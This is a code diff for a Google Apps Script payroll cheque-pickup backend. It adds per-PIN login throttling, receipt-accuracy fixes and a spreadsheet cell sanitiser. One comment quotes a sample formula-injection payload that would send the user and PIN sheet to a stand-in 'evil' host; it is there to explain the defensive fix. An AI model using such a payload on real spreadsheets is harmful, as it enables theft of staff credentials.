@@ -33,14 +33,18 @@ function doPost(e) {
       return respond(getReceipt(payload.receiptId, null));
     }
 
-    if (pinLockStatus_()) {
+    // Per-PIN throttle only. A valid PIN is never blocked here (a correct
+    // submission clears its own counter), so authenticated staff are unaffected
+    // by anyone else's failed attempts. See the notes above pinLockStatus_.
+    if (pinLockStatus_(payload.pin)) {
       return respond({ error: 'Too many failed attempts — try again in 15 minutes' });
     }
     var user = getUser(payload.pin);
     if (!user) {
-      recordPinAttempt_(false);
+      recordPinAttempt_(payload.pin, false);
       return respond({ error: 'Invalid PIN' });
     }
+    recordPinAttempt_(payload.pin, true);
 
     switch (action) {
       case 'getWeeks':      return respond(getWeeks(user));
@@ -92,8 +96,18 @@ function parseWeekDate(weekCode) {
 
   if (candidate.getMonth() !== mm - 1 || candidate.getDate() !== dd) return 0;
 
-  if (candidate.getTime() - now.getTime() > 180 * 24 * 60 * 60 * 1000) {
+  // Week codes carry no year, so infer the nearest one. The forward guard was
+  // already here; the backward guard was missing, which meant that in late
+  // December an early-January week resolved to January of the CURRENT year —
+  // eleven months in the past. It then sorted below every week of the year just
+  // ending, so staff auto-landed on a stale week at login and the live week fell
+  // off the bottom of the dropdown (and out of the offline cache, which only
+  // keeps the first four entries of weekOrder).
+  var HALF_YEAR = 180 * 24 * 60 * 60 * 1000;
+  if (candidate.getTime() - now.getTime() > HALF_YEAR) {
     candidate = new Date(year - 1, mm - 1, dd);
+  } else if (now.getTime() - candidate.getTime() > HALF_YEAR) {
+    candidate = new Date(year + 1, mm - 1, dd);
   }
   return candidate.getTime();
 }
@@ -174,32 +188,66 @@ function normalizeOffice(office) {
 }
 
 // ---- PIN VERIFICATION ----
-// FIX: brute-force throttling. The web app URL is public (it's in the GitHub
-// Pages source) and a 4-digit PIN has only 10,000 combinations. Apps Script
-// exposes no client IP, so this is a global counter: 10 consecutive failures
-// lock ALL PIN attempts for 15 minutes. Legitimate typos reset on any success.
+// Brute-force throttling. The web app URL is public (it's in the GitHub Pages
+// source) and a 4-digit PIN has only 10,000 combinations, so throttling is
+// required. Apps Script exposes no client IP.
+//
+// FIX: the counter used to be a single global bucket checked BEFORE getUser on
+// every action, so ten bad PINs from anywhere on the internet locked every user
+// out of every action for 15 minutes — and cache.put refreshed the TTL on each
+// failure, making it indefinite. Now:
+//
+//   1. Per-PIN counter (primary). Keyed by a hash of the submitted PIN, so one
+//      attacker hammering a wrong PIN cannot affect anyone else. Note a VALID
+//      PIN can never be locked this way: a correct submission succeeds and
+//      clears its counter, so only wrong PIN strings ever accumulate failures.
+//   2. Global counter (backstop) for enumeration — trying 10,000 distinct PINs
+//      once each would never trip a per-PIN counter. Threshold is set far above
+//      plausible typo volume, and it gates ONLY verifyPin. Staff who are already
+//      authenticated keep working normally through an attack.
 
-var PIN_LOCK_MAX_FAILS = 10;
-var PIN_LOCK_SECONDS = 900; // 15 minutes
+var PIN_LOCK_MAX_FAILS = 8;      // per distinct wrong PIN
+var PIN_GLOBAL_MAX_FAILS = 60;   // across all PINs; gates new logins only
+var PIN_LOCK_SECONDS = 900;      // 15 minutes
 
-function pinLockStatus_() {
-  var fails = Number(CacheService.getScriptCache().get('pin_fails') || 0);
+function pinFailKey_(pin) {
+  var digest = Utilities.computeDigest(Utilities.DigestAlgorithm.MD5, String(pin || ''));
+  var hex = '';
+  for (var i = 0; i < 6; i++) {
+    var b = digest[i] < 0 ? digest[i] + 256 : digest[i];
+    hex += ('0' + b.toString(16)).slice(-2);
+  }
+  return 'pf_' + hex;
+}
+
+// Per-PIN lock. Safe to call on every request — never blocks a valid PIN.
+function pinLockStatus_(pin) {
+  var fails = Number(CacheService.getScriptCache().get(pinFailKey_(pin)) || 0);
   return fails >= PIN_LOCK_MAX_FAILS;
 }
 
-function recordPinAttempt_(success) {
+// Global lock. Only consulted by verifyPin, never by authenticated actions.
+function pinGlobalLockStatus_() {
+  var fails = Number(CacheService.getScriptCache().get('pin_fails_global') || 0);
+  return fails >= PIN_GLOBAL_MAX_FAILS;
+}
+
+function recordPinAttempt_(pin, success) {
   var cache = CacheService.getScriptCache();
-  if (success) { cache.remove('pin_fails'); return; }
-  var fails = Number(cache.get('pin_fails') || 0) + 1;
-  cache.put('pin_fails', String(fails), PIN_LOCK_SECONDS);
+  var key = pinFailKey_(pin);
+  if (success) { cache.remove(key); return; }
+  var fails = Number(cache.get(key) || 0) + 1;
+  cache.put(key, String(fails), PIN_LOCK_SECONDS);
+  var g = Number(cache.get('pin_fails_global') || 0) + 1;
+  cache.put('pin_fails_global', String(g), PIN_LOCK_SECONDS);
 }
 
 function verifyPin(pin) {
-  if (pinLockStatus_()) {
+  if (pinLockStatus_(pin) || pinGlobalLockStatus_()) {
     return { ok: false, error: 'Too many failed attempts — try again in 15 minutes' };
   }
   var user = getUser(pin);
-  recordPinAttempt_(!!user);
+  recordPinAttempt_(pin, !!user);
   if (user) {
     return {
       ok: true,
@@ -207,6 +255,26 @@ function verifyPin(pin) {
     };
   }
   return { ok: false, error: 'Incorrect PIN' };
+}
+
+// ---- CELL WRITE SANITISER ----
+// FIX: Apps Script setValue()/appendRow() on a string starting with '=' enters a
+// LIVE FORMULA, not text. Any PIN holder could save a comment of
+//   =IMAGE("https://evil/?d="&ENCODEURL(TEXTJOIN("|",1,_Users!A1:E50)))
+// and have Google's own servers exfiltrate the whole _Users sheet — every name,
+// plaintext PIN and office scope — on recalculation. Also blocks DDE payloads
+// from reaching anyone who opens a CSV/XLSX export in Excel.
+// Applied at every point client-supplied text reaches a cell.
+function sanitizeCell_(v) {
+  if (v === null || v === undefined) return '';
+  if (typeof v === 'number' || typeof v === 'boolean' || v instanceof Date) return v;
+  var s = String(v);
+  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
+  return s;
+}
+
+function sanitizeRow_(arr) {
+  return arr.map(sanitizeCell_);
 }
 
 // ---- GET AVAILABLE WEEKS & OFFICES ----
@@ -239,13 +307,47 @@ function getWeeks(user) {
   return { weeks: sorted, weekOrder: sortedWeekKeys };
 }
 
+// Explain WHY column detection failed, so the UI can show something actionable
+// instead of an empty list. detectColumns requires lastName, chqNo, signature
+// and mode; a renamed header or a merged header cell drops one of them.
+function describeColumnFailure_(data, sheetName) {
+  var required = ['lastName', 'chqNo', 'signature', 'mode'];
+  var labels = { lastName: 'Last Name', chqNo: 'Chq No.', signature: 'Signature', mode: 'Mode' };
+  var best = null, bestCount = -1;
+
+  for (var r = 0; r < Math.min(data.length, 20); r++) {
+    var partial = detectColumnsInRow_(data[r]);
+    var found = 0;
+    for (var i = 0; i < required.length; i++) if (partial[required[i]] !== undefined) found++;
+    if (found > bestCount) { bestCount = found; best = partial; }
+  }
+
+  var missing = [];
+  for (var j = 0; j < required.length; j++) {
+    if (!best || best[required[j]] === undefined) missing.push(labels[required[j]]);
+  }
+
+  if (missing.length === 0) {
+    return sheetName + ': could not read the header row. Check for merged header cells — Google Sheets only returns a merged value in its top-left cell.';
+  }
+  return sheetName + ': missing required column' + (missing.length !== 1 ? 's' : '') + ' — ' + missing.join(', ')
+       + '. Cheques in this office will not appear until the header row is corrected or the name is added to detectColumns().';
+}
+
 // ---- READ CHEQUES FROM A SINGLE SHEET (shared helper) ----
 
-function readChequesFromSheet(sheet, name, week, office, user, hasOfficeAccess) {
+function readChequesFromSheet(sheet, name, week, office, user, hasOfficeAccess, warnings) {
   var cheques = [];
   var data = sheet.getDataRange().getValues();
   var colMap = detectColumns(data);
-  if (!colMap) return cheques;
+  if (!colMap) {
+    // FIX: this used to return an empty array silently. The office still appeared
+    // in the dropdown and every search said "No cheques match" — indistinguishable
+    // from an empty week, with no error anywhere. Report which columns are missing
+    // so the cause is visible instead of being diagnosed as a flaky search.
+    if (warnings) warnings.push(describeColumnFailure_(data, name));
+    return cheques;
+  }
 
   for (var i = colMap.headerRow + 1; i < data.length; i++) {
     var row = data[i];
@@ -294,6 +396,7 @@ function getWeekData(week, user, officeFilter) {
   var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
   var sheets = ss.getSheets();
   var allCheques = [];
+  var warnings = [];
 
   sheets.forEach(function(sheet) {
     var name = sheet.getName();
@@ -310,11 +413,14 @@ function getWeekData(week, user, officeFilter) {
     var hasClientEntries = user ? userHasAnyClientAccess(user) : false;
     if (!hasOfficeAccess && !hasClientEntries) return;
 
-    var cheques = readChequesFromSheet(sheet, name, week, office, user, hasOfficeAccess);
+    var cheques = readChequesFromSheet(sheet, name, week, office, user, hasOfficeAccess, warnings);
     allCheques = allCheques.concat(cheques);
   });
 
-  return { week: week, office: filterOffice || 'ALL', cheques: allCheques, timestamp: new Date().toISOString() };
+  return {
+    week: week, office: filterOffice || 'ALL', cheques: allCheques,
+    warnings: warnings, timestamp: new Date().toISOString()
+  };
 }
 
 // ---- COLUMN DETECTION ----
@@ -333,33 +439,7 @@ function detectColumns(data) {
     }
     if (!found) continue;
 
-    var map = {};
-    for (var c2 = 0; c2 < row.length; c2++) {
-      var val = row[c2];
-      if (!val) continue;
-      var nm = String(val).toLowerCase().replace(/[\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
-
-      if (map.lastName === undefined && (nm === 'last name' || nm === 'surname' || nm === 'family name' || nm === 'lastname')) map.lastName = c2;
-      else if (map.firstName === undefined && (nm === 'first name' || nm === 'given name' || nm === 'firstname')) map.firstName = c2;
-      else if (map.client === undefined && nm.indexOf('client') !== -1) map.client = c2;
-      else if (map.mode === undefined && (nm === 'mode' || nm === 'pay mode' || nm === 'payment type' || nm === 'payment mode')) map.mode = c2;
-      else if (map.chqNo === undefined && (nm.indexOf('chq') !== -1 || nm.indexOf('cheque') !== -1 || nm.indexOf('check') !== -1) && (nm.indexOf('no') !== -1 || nm.indexOf('num') !== -1 || nm.indexOf('#') !== -1)) map.chqNo = c2;
-      else if (map.netPay === undefined && nm.indexOf('net') !== -1 && nm.indexOf('pay') !== -1) map.netPay = c2;
-      else if (map.payRate === undefined && (nm === 'rate' || nm === 'pay rate' || nm === 'hourly rate' || nm === 'rate of pay' || nm === 'rate/hr' || nm === 'hr rate')) map.payRate = c2;
-      else if (map.hours === undefined && (nm === 'hours' || nm === 'hrs' || nm === 'reg hours' || nm === 'regular hours' || nm === 'reg hrs' || nm === 'total hours' || nm === 'hours worked')) map.hours = c2;
-      else if (map.signature === undefined && (nm === 'signature' || nm === 'sign' || nm === 'proof' || nm === 'sig')) map.signature = c2;
-      else if (map.comments === undefined && (nm === 'comment' || nm === 'comments' || nm === 'remarks' || nm === 'remark' || nm === 'notes' || nm === 'note')) map.comments = c2;
-      else if (map.empNo === undefined && (nm === 'emp no' || nm === 'emp no.' || nm === 'emp #' || nm === 'employee no' || nm === 'employee no.' || nm === 'employee #' || nm === 'employee number' || nm === 'empno')) map.empNo = c2;
-      else if (map.jigId === undefined && (nm === 'jig_id' || nm === 'jig id' || nm === 'jigid' || nm === 'jig_no' || nm === 'jig no' || nm === 'jig #')) map.jigId = c2;
-    }
-
-    if (map.netPay === undefined) {
-      for (var c3 = 0; c3 < row.length; c3++) {
-        var val3 = row[c3]; if (!val3) continue;
-        var nm3 = String(val3).toLowerCase().replace(/[\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
-        if (nm3.indexOf('net') !== -1 || nm3 === 'take home' || nm3 === 'take home pay') { map.netPay = c3; break; }
-      }
-    }
+    var map = detectColumnsInRow_(row);
 
     if (map.lastName !== undefined && map.chqNo !== undefined && map.signature !== undefined && map.mode !== undefined) {
       map.headerRow = r;
@@ -367,6 +447,48 @@ function detectColumns(data) {
     }
   }
   return null;
+}
+
+// Header-name → column-index mapping for a single row. Extracted from
+// detectColumns so describeColumnFailure_ can report which columns are missing.
+function detectColumnsInRow_(row) {
+  var map = {};
+  if (!row) return map;
+
+  for (var c2 = 0; c2 < row.length; c2++) {
+    var val = row[c2];
+    if (!val) continue;
+    var nm = String(val).toLowerCase().replace(/[\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
+
+    {
+      if (map.lastName === undefined && (nm === 'last name' || nm === 'surname' || nm === 'family name' || nm === 'lastname')) map.lastName = c2;
+      else if (map.firstName === undefined && (nm === 'first name' || nm === 'given name' || nm === 'firstname')) map.firstName = c2;
+      else if (map.client === undefined && nm.indexOf('client') !== -1) map.client = c2;
+      else if (map.mode === undefined && (nm === 'mode' || nm === 'pay mode' || nm === 'payment type' || nm === 'payment mode' || nm === 'payment method' || nm === 'pay method' || nm === 'method' || nm === 'pay type')) map.mode = c2;
+      else if (map.chqNo === undefined && (nm.indexOf('chq') !== -1 || nm.indexOf('cheque') !== -1 || nm.indexOf('check') !== -1) && (nm.indexOf('no') !== -1 || nm.indexOf('num') !== -1 || nm.indexOf('#') !== -1)) map.chqNo = c2;
+      else if (map.netPay === undefined && nm.indexOf('net') !== -1 && nm.indexOf('pay') !== -1) map.netPay = c2;
+      else if (map.payRate === undefined && (nm === 'rate' || nm === 'pay rate' || nm === 'hourly rate' || nm === 'rate of pay' || nm === 'rate/hr' || nm === 'rate/hour' || nm === 'rate per hour' || nm === 'hr rate' || nm === 'hourly')) map.payRate = c2;
+      else if (map.hours === undefined && (nm === 'hours' || nm === 'hrs' || nm === 'reg hours' || nm === 'reg. hours' || nm === 'regular hours' || nm === 'reg hrs' || nm === 'reg. hrs' || nm === 'total hours' || nm === 'total hrs' || nm === 'hours worked' || nm === 'hrs worked')) map.hours = c2;
+      else if (map.signature === undefined && (nm === 'signature' || nm === 'sign' || nm === 'proof' || nm === 'sig' || nm === 'sig.' || nm === 'signed' || nm === 'signed by' || nm === 'received by' || nm === 'collected by')) map.signature = c2;
+      else if (map.comments === undefined && (nm === 'comment' || nm === 'comments' || nm === 'remarks' || nm === 'remark' || nm === 'notes' || nm === 'note')) map.comments = c2;
+      // FIX: 'Emp. No.' (period after Emp) was missing, and two of the six header
+      // layouts in the live workbook use exactly that — so those offices silently
+      // lost the employee-number column: no Emp badge, no search by employee
+      // number, and no prefill on the missing-hours form.
+      else if (map.empNo === undefined && (nm === 'emp no' || nm === 'emp no.' || nm === 'emp. no' || nm === 'emp. no.' || nm === 'emp.no.' || nm === 'emp #' || nm === 'emp. #' || nm === 'employee no' || nm === 'employee no.' || nm === 'employee #' || nm === 'employee number' || nm === 'empno')) map.empNo = c2;
+      else if (map.jigId === undefined && (nm === 'jig_id' || nm === 'jig id' || nm === 'jigid' || nm === 'jig_no' || nm === 'jig no' || nm === 'jig #')) map.jigId = c2;
+    }
+  }
+
+  if (map.netPay === undefined) {
+    for (var c3 = 0; c3 < row.length; c3++) {
+      var val3 = row[c3]; if (!val3) continue;
+      var nm3 = String(val3).toLowerCase().replace(/[\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
+      if (nm3.indexOf('net') !== -1 || nm3 === 'take home' || nm3 === 'take home pay') { map.netPay = c3; break; }
+    }
+  }
+
+  return map;
 }
 
 // ---- SEARCH CHEQUES ----
@@ -546,8 +668,19 @@ function writeReceiptRow_(ss, receiptId, distributor, collector, timestamp, week
     if (String(receiptSheet.getRange(1, 8).getValue() || '').trim() === '') {
       receiptSheet.getRange(1, 8).setValue('ServerTime');
     }
-    receiptSheet.appendRow([receiptId, distributor, collector, timestamp, weekEnding, photoUrl, JSON.stringify(chequeLocators), new Date().toISOString()]);
-  } catch (err) { /* silent — receipt logging is best-effort */ }
+    // FIX: receiptId, collector, timestamp and weekEnding are raw client fields.
+    // sanitizeCell_ stops a leading '=' becoming a live formula in the audit sheet.
+    receiptSheet.appendRow(sanitizeRow_([
+      receiptId, distributor, collector, timestamp, weekEnding, photoUrl,
+      JSON.stringify(chequeLocators), new Date().toISOString()
+    ]));
+    return true;
+  } catch (err) {
+    // FIX: this used to swallow the failure silently while the caller still
+    // returned a receiptId and the UI still showed a QR code — the employee
+    // scanned it and got "Receipt not found". Report it so the client can say so.
+    return false;
+  }
 }
 
 // ---- CONFIRM PICKUP ----
@@ -566,6 +699,7 @@ function confirmPickup(data, user) {
 
   var anySuccess = false;
   var alreadyCollected = [];
+  var writtenLocators = [];
 
   var lock = LockService.getScriptLock();
   try { lock.waitLock(15000); }
@@ -598,22 +732,32 @@ function confirmPickup(data, user) {
 
       cell.setValue(sigText);
       results.push({ uid: c.uid, ok: true });
+      // FIX: record the locator only for cheques actually written. This used to
+      // be built from data.cheques (the whole submitted cart) after the loop, so
+      // a cheque rejected as already-collected still appeared on the receipt —
+      // the employee's copy overstated both the count and the total.
+      writtenLocators.push({ chqNo: rv.chqNo || c.chqNo, sheetName: c.sheetName, rowIndex: c.rowIndex });
       anySuccess = true;
     }
+    // FIX: force the buffered signature writes out before releasing the lock.
+    // Without this the last setValue could still be buffered while the next
+    // request acquires the lock and reads the cell as empty.
+    SpreadsheetApp.flush();
   } finally {
     lock.releaseLock();
   }
 
   var photo = anySuccess ? uploadPhoto_(data.photoBase64, data.photoFilename, data.weekEnding) : { url: '', error: '' };
 
+  var receiptWritten = false;
   if (anySuccess) {
-    var chequeLocators = data.cheques.map(function(c) {
-      return { chqNo: c.chqNo, sheetName: c.sheetName, rowIndex: c.rowIndex };
-    });
-    writeReceiptRow_(ss, receiptId, distributor, collector, data.timestamp, data.weekEnding, photo.url, chequeLocators);
+    receiptWritten = writeReceiptRow_(ss, receiptId, distributor, collector, data.timestamp, data.weekEnding, photo.url, writtenLocators);
   }
 
-  return { results: results, receiptId: receiptId, photoUrl: photo.url, photoError: photo.error, alreadyCollected: alreadyCollected };
+  return {
+    results: results, receiptId: receiptId, photoUrl: photo.url, photoError: photo.error,
+    alreadyCollected: alreadyCollected, receiptWritten: receiptWritten
+  };
 }
 
 // ---- GET RECEIPT ----
@@ -672,7 +816,12 @@ function getReceipt(receiptId, user) {
 
   // Resolve a sheetName for every entry (old or new)
   var bySheet = {};
-  storedCheques.forEach(function(c) {
+  storedCheques.forEach(function(c, idx) {
+    // FIX: entries used to be keyed by chqNo alone. Cheque numbers are only
+    // unique per office, so a batch spanning two offices with the same number
+    // collapsed into one line — the receipt printed one employee twice and
+    // dropped the other, with a total that was wrong by the difference.
+    c._k = idx;
     var sName = c.sheetName;
     if (!sName && c.week && c.office) {
       // Old receipt: reconstruct from stored week + office fields
@@ -689,7 +838,7 @@ function getReceipt(receiptId, user) {
   });
 
   // Read each distinct sheet once and enrich all its entries
-  var refetched = {};  // chqNo → enriched cheque object
+  var refetched = {};  // storedCheques index (_k) → enriched cheque object
 
   Object.keys(bySheet).forEach(function(sheetName) {
     if (sheetName === '__unresolvable__') return;
@@ -713,24 +862,42 @@ function getReceipt(receiptId, user) {
     var chqIndex = {};  // chqNo → row index (only built when needed)
     var chqIndexBuilt = false;
 
+    function findByChqNo_(wanted) {
+      if (!chqIndexBuilt) {
+        for (var ri2 = colMap.headerRow + 1; ri2 < data.length; ri2++) {
+          var cn = String(data[ri2][colMap.chqNo] || '').trim();
+          if (cn) chqIndex[cn] = ri2;
+        }
+        chqIndexBuilt = true;
+      }
+      return chqIndex[String(wanted).trim()];
+    }
+
     bySheet[sheetName].forEach(function(entry) {
-      var r;
+      var r = null;
+      var wantChq = entry.chqNo !== undefined && entry.chqNo !== null ? String(entry.chqNo).trim() : '';
 
       if (entry.rowIndex !== undefined) {
-        // New format: jump directly to the stored row index
+        // New format: jump directly to the stored row index...
         var ri = entry.rowIndex;
-        if (ri < colMap.headerRow + 1 || ri >= data.length) return;
-        r = data[ri];
+        if (ri >= colMap.headerRow + 1 && ri < data.length) {
+          // FIX: ...but verify the row still holds the cheque we recorded. Row
+          // indexes are positional; sorting or inserting rows in a payroll tab
+          // used to make every historical receipt for that week silently render
+          // different employees and a different total — including through the
+          // public QR link the employee is holding.
+          var rowChq = String(data[ri][colMap.chqNo] || '').trim();
+          if (!wantChq || rowChq === wantChq) r = data[ri];
+        }
+        if (!r && wantChq) {
+          // Row moved — fall back to locating it by cheque number.
+          var moved = findByChqNo_(wantChq);
+          if (moved !== undefined) r = data[moved];
+        }
+        if (!r) return;
       } else {
         // Old format: find the row by scanning for matching chqNo
-        if (!chqIndexBuilt) {
-          for (var ri2 = colMap.headerRow + 1; ri2 < data.length; ri2++) {
-            var cn = String(data[ri2][colMap.chqNo] || '').trim();
-            if (cn) chqIndex[cn] = ri2;
-          }
-          chqIndexBuilt = true;
-        }
-        var foundRow = chqIndex[String(entry.chqNo).trim()];
+        var foundRow = findByChqNo_(wantChq);
         if (foundRow === undefined) return;
         r = data[foundRow];
       }
@@ -745,7 +912,7 @@ function getReceipt(receiptId, user) {
       var empNo     = colMap.empNo   !== undefined ? String(r[colMap.empNo]  || '').trim() : '';
       var jigId     = colMap.jigId   !== undefined ? String(r[colMap.jigId]  || '').trim() : '';
 
-      refetched[entry.chqNo] = {
+      refetched[entry._k] = {
         chqNo: chqNo || entry.chqNo,
         name: lastName + ' ' + firstName,
         client: client,
@@ -763,9 +930,9 @@ function getReceipt(receiptId, user) {
   // Assemble final cheque list
   var cheques = [];
   storedCheques.forEach(function(entry) {
-    if (refetched[entry.chqNo]) {
+    if (refetched[entry._k]) {
       // Successfully re-fetched from sheet — always prefer live data
-      cheques.push(refetched[entry.chqNo]);
+      cheques.push(refetched[entry._k]);
     } else if (entry.name || entry.netPay) {
       // Old receipt whose sheet is gone — return stored blob so receipt still renders
       cheques.push(entry);
@@ -812,13 +979,18 @@ function updateComment(data, user) {
 
   if (sv.colMap.comments === undefined) return { error: 'No comments column found in: ' + data.sheetName };
 
-  var rv = validateChequeRow(sv.data, sv.colMap, data.rowIndex, user, sv.hasOfficeAccess);
+  // FIX: this was the only write path not passing expectedChqNo. rowIndex is
+  // positional and captured at search time, so if a row was inserted or the tab
+  // was sorted in between, the comment — which is also the HOLD mechanism —
+  // landed on a different employee's cheque and still returned {ok:true}.
+  var rv = validateChequeRow(sv.data, sv.colMap, data.rowIndex, user, sv.hasOfficeAccess, data.chqNo);
   if (rv.error) return { error: rv.error };
 
   try {
     var cell = sv.sheet.getRange(data.rowIndex + 1, sv.colMap.comments + 1);
-    cell.setValue(String(data.comment || '').trim());
-    return { ok: true, comment: String(data.comment || '').trim() };
+    var text = String(data.comment || '').trim();
+    cell.setValue(sanitizeCell_(text));
+    return { ok: true, comment: text };
   } catch (err) {
     return { error: err.toString() };
   }
@@ -827,20 +999,40 @@ function updateComment(data, user) {
 // ---- UPLOAD PAYROLL ----
 
 function uploadPayroll(data, user) {
-  if (user && user.role !== 'admin') return { error: 'Only admins can upload payroll' };
+  if (user.role !== 'admin') return { error: 'Only admins can upload payroll' };
   if (!data.weekEnding || !data.sheets || data.sheets.length === 0) return { error: 'Invalid upload data' };
 
+  // FIX: the week code was never validated here, but every reader enforces
+  // /^WE\d{4}$/. A typed "WE 0214" created tabs that were permanently invisible
+  // to the whole application while sitting in the spreadsheet — and the upload
+  // reported "3 tabs created".
+  var weekEnding = String(data.weekEnding).toUpperCase().trim();
+  if (!/^WE\d{4}$/.test(weekEnding)) {
+    return { error: 'Invalid week code "' + data.weekEnding + '" — must look like WE0214 (WE followed by 4 digits, no spaces).' };
+  }
+
   var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
-  var created = 0, skipped = 0, errors = [];
+  var created = 0, errors = [], createdTabs = [], skippedTabs = [];
 
   for (var s = 0; s < data.sheets.length; s++) {
     var sheetData = data.sheets[s];
-    var tabName = data.weekEnding + '_' + sheetData.name;
 
-    if (ss.getSheetByName(tabName)) { skipped++; continue; }
+    // FIX: worksheet names came straight from the uploaded workbook and ended up
+    // inside the uid the frontend writes into data-uid attributes. Constrain
+    // them so a hostile or malformed tab name cannot break out.
+    var officeName = String(sheetData.name || '').trim();
+    if (!/^[A-Za-z0-9 ._&()-]{1,40}$/.test(officeName)) {
+      errors.push('"' + officeName + '": invalid worksheet name — use letters, digits, spaces and . _ & ( ) - only (max 40 chars)');
+      continue;
+    }
 
+    var tabName = weekEnding + '_' + officeName;
+
+    if (ss.getSheetByName(tabName)) { skippedTabs.push(tabName); continue; }
+
+    var sheet = null;
     try {
-      var sheet = ss.insertSheet(tabName);
+      sheet = ss.insertSheet(tabName);
       var rows = sheetData.rows;
       if (rows.length > 0) {
         var maxCols = 0;
@@ -850,18 +1042,50 @@ function uploadPayroll(data, user) {
         for (var r2 = 0; r2 < rows.length; r2++) {
           while (rows[r2].length < maxCols) rows[r2].push('');
         }
-        sheet.getRange(1, 1, rows.length, maxCols).setValues(rows);
+        // FIX: a hostile or malformed .xlsx could plant live formulas here.
+        var safeRows = rows.map(sanitizeRow_);
+        sheet.getRange(1, 1, safeRows.length, maxCols).setValues(safeRows);
       }
       created++;
+      createdTabs.push(tabName);
     } catch (err) {
+      // FIX: insertSheet and setValues are separate operations. A failure between
+      // them used to leave an empty tab, which the retry path then SKIPPED as
+      // "already exists" — permanently. Roll it back so a retry can succeed.
+      if (sheet) {
+        try { ss.deleteSheet(sheet); } catch (e2) { /* leave it; reported below */ }
+      }
       errors.push(tabName + ': ' + err.toString());
     }
   }
 
-  return {
-    ok: true, created: created, skipped: skipped, errors: errors,
-    message: created + ' tabs created' + (skipped > 0 ? ', ' + skipped + ' already existed' : '')
+  var skipped = skippedTabs.length;
+  var parts = [];
+  if (created > 0) parts.push(created + ' tab' + (created !== 1 ? 's' : '') + ' created');
+  if (skipped > 0) parts.push(skipped + ' already existed and ' + (skipped !== 1 ? 'were' : 'was') + ' NOT updated');
+  if (errors.length > 0) parts.push(errors.length + ' failed');
+
+  // FIX: this used to always return ok:true with no top-level error, so the UI
+  // showed a green tick even when every tab failed or nothing was written at all.
+  var result = {
+    created: created, skipped: skipped, errors: errors,
+    createdTabs: createdTabs, skippedTabs: skippedTabs,
+    weekEnding: weekEnding,
+    message: parts.length ? parts.join(', ') : 'Nothing to do'
   };
+
+  if (created === 0 && errors.length > 0) {
+    result.error = 'Upload failed — no tabs were created. ' + errors.join(' | ');
+    return result;
+  }
+  result.ok = true;
+  // Partial or no-op outcomes the admin must see rather than a plain success tick.
+  result.warning = (created === 0 && skipped > 0)
+    ? 'Nothing was written. ' + skipped + ' tab(s) for ' + weekEnding + ' already exist and are never overwritten, '
+      + 'so corrections in this file have NOT been applied. To re-import a week, delete the existing tab(s) in Google Sheets first — '
+      + 'note that deleting a tab also deletes any pickup signatures recorded against it.'
+    : (errors.length > 0 ? errors.length + ' tab(s) failed: ' + errors.join(' | ') : '');
+  return result;
 }
 
 // ---- VOID CHEQUES ----
@@ -876,6 +1100,7 @@ function voidCheques(data, user) {
 
   var anySuccess = false;
   var alreadyCollected = [];
+  var writtenLocators = [];
 
   var lock = LockService.getScriptLock();
   try { lock.waitLock(15000); }
@@ -905,22 +1130,26 @@ function voidCheques(data, user) {
 
       cell.setValue(sigText);
       results.push({ uid: c.uid, ok: true });
+      // FIX: locators for voided cheques only — see the note in confirmPickup.
+      writtenLocators.push({ chqNo: rv.chqNo || c.chqNo, sheetName: c.sheetName, rowIndex: c.rowIndex });
       anySuccess = true;
     }
+    SpreadsheetApp.flush();
   } finally {
     lock.releaseLock();
   }
 
   var photo = anySuccess ? uploadPhoto_(data.photoBase64, data.photoFilename, data.weekEnding) : { url: '', error: '' };
 
+  var receiptWritten = false;
   if (anySuccess) {
-    var chequeLocators = data.cheques.map(function(c) {
-      return { chqNo: c.chqNo, sheetName: c.sheetName, rowIndex: c.rowIndex };
-    });
-    writeReceiptRow_(ss, receiptId, voidedBy, 'VOID', data.timestamp, data.weekEnding, photo.url, chequeLocators);
+    receiptWritten = writeReceiptRow_(ss, receiptId, voidedBy, 'VOID', data.timestamp, data.weekEnding, photo.url, writtenLocators);
   }
 
-  return { results: results, receiptId: receiptId, photoUrl: photo.url, photoError: photo.error, alreadyCollected: alreadyCollected };
+  return {
+    results: results, receiptId: receiptId, photoUrl: photo.url, photoError: photo.error,
+    alreadyCollected: alreadyCollected, receiptWritten: receiptWritten
+  };
 }
 
 // =============================================
@@ -957,6 +1186,36 @@ function detectPostsLayout_(header) {
 
 // ── Get posts (filtered by user's offices) ──
 
+// Shared post visibility test.
+// FIX: this used to be inline in handleGetPosts only, so resolve and comment had
+// no office check at all. Also fixes a fail-open bug: 'Toronto,'.split(',') gives
+// ['Toronto', ''] and uo.indexOf('') returns 0, which made any post with a
+// trailing comma or a blank Offices cell visible to every office. Empty tokens
+// are now dropped, and a post with no office scope at all is treated as
+// company-wide (the documented default) rather than accidentally so.
+function postVisibleToUser_(officesCsv, user) {
+  if (!user) return false;
+  if (user.allOffices || user.role === 'admin') return true;
+
+  var postOffices = String(officesCsv || '').split(',')
+    .map(function(s){ return s.trim(); })
+    .filter(function(s){ return s.length > 0; });
+
+  if (postOffices.length === 0) return true; // no scope recorded == all offices
+
+  var userOffices = (user.offices || [])
+    .map(function(o){ return String(o).trim().toLowerCase(); })
+    .filter(function(o){ return o.length > 0; });
+
+  return postOffices.some(function(po) {
+    var p = po.toLowerCase();
+    if (p === 'all offices') return true;
+    return userOffices.some(function(uo) {
+      return p.indexOf(uo) !== -1 || uo.indexOf(p) !== -1;
+    });
+  });
+}
+
 function handleGetPosts(data, user) {
   var sheet = getOrCreatePostsSheet_();
   var rows = sheet.getDataRange().getValues();
@@ -971,25 +1230,15 @@ function handleGetPosts(data, user) {
   var posts = [];
   for (var i = 1; i < rows.length; i++) {
     var row = rows[i];
-    var postOffices = String(row[4] || '').split(',').map(function(s){ return s.trim(); });
+    var postOffices = String(row[4] || '').split(',')
+      .map(function(s){ return s.trim(); })
+      .filter(function(s){ return s.length > 0; });
 
-    if (!user.allOffices && user.role !== 'admin') {
-      var userOffices = (user.offices || []).map(function(o){ return o.toLowerCase(); });
-      var hasClientAccess = userHasAnyClientAccess(user);
-
-      var visible = postOffices.some(function(po) {
-        if (po.toLowerCase() === 'all offices') return true;
-        return userOffices.some(function(uo) {
